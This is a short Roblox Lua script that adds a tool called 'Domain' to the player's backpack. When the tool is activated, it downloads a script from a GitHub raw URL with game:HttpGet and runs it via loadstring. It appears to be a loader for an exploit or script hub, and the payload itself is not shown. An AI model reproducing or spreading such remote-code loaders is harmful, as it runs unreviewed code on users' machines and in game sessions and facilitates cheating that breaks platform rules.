
local tool = Instance.new("Tool")
tool.Name = "Domain"
tool.RequiresHandle = false  -- No handle needed


tool.Parent = game.Players.LocalPlayer.Backpack


tool.Activated:Connect(function()
    print("Tool activated!")


    local code = [[
loadstring(game:HttpGet"https://raw.githubusercontent.com/tamarixr/tamhub/main/ddo.lua")()  
    ]]
    local func = loadstring(code)
    if func then
        func()
    end
end)
